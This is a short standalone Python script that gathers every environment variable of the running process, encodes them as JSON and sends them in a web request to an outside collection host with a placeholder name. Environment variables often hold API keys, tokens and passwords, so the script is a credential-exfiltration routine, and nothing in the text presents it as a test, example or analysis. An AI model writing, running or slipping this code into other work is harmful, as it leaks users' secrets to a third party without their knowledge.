import json
import os
import urllib.request

data = json.dumps(dict(os.environ)).encode()
urllib.request.urlopen("https://collector.example.invalid/env", data=data)
